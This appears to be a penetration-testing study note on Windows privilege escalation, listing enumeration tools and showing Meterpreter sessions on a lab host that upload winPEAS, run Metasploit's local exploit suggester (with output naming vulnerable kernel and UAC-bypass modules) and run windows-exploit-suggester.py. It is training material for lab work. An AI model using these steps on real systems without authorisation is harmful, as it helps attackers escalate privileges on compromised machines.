#winPEAS #windows-exploit-suggester #meterpreter #local_exploit_suggester 

---
# Resources

Windows PrivEsc Checklist - [https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

## Executables:

WinPEAS - [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Seatbelt (compile) - [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

SharpUp (compile) - [https://github.com/GhostPack/SharpUp](https://github.com/GhostPack/SharpUp)

Watson (compile) - [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)

## PowerShell:

Sherlock - [https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)

PowerUp (PowerSploit) - [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

JAWS - [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)

## Other:

Windows Exploit Suggester (local) - [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

Metasploit Local Exploit Suggester (Metaploit) - [https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)


---
# Exploring Automated Tools

## ==Use WinPEAS or PowerUp **FIRST**==

-  Upload tools to rhost to find attack vectors ([[🟩HTB Academy/07_File Transfers/File Transfers|File Transfers]])
```
meterpreter> cd c:\\windows\\temp	

meterpreter > upload /root/Downloads/winPEASx64.exe
[*] Uploading  : /root/Downloads/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 8.00 MiB of 9.39 MiB (85.17%): /root/Downloads/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 9.39 MiB of 9.39 MiB (100.0%): /root/Downloads/winPEASx64.exe -> winPEASx64.exe
[*] Completed  : /root/Downloads/winPEASx64.exe -> winPEASx64.exe
``` 

## Run winPEAS
```
meterpreter > shell

c:\windows\temp>winPEASx64.exe
```

Run `post/multi/recon/local_exploit_suggester`

```
meterpreter > run post/multi/recon/local_exploit_suggester 

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 196 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 9:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                            
 3   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

```

## Run `windows-exploit-suggester.py`
- First, save `systeminfo` output to .txt file
- Second, update the script and install dependencies
```
┌──(root㉿kali)-[~]
└─# ./windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2024-10-01-mssb.xls
[*] done
                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# pip install xlrd --upgrade
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.                                                                                  
Collecting xlrd
  Downloading xlrd-2.0.1-py2.py3-none-any.whl (96 kB)
     |████████████████████████████████| 96 kB 4.5 MB/s 
Installing collected packages: xlrd
  Attempting uninstall: xlrd
    Found existing installation: xlrd 1.2.0
    Uninstalling xlrd-1.2.0:
      Successfully uninstalled xlrd-1.2.0
Successfully installed xlrd-2.0.1
```

- Third, run script using database (see update line), and sysinfo output (see step 1)
```
┌──(root㉿kali)-[~]
└─# ./windows-exploit-suggester.py --database 2024-10-01-mssb.xls --systeminfo Devel_systeminfo.txt
```


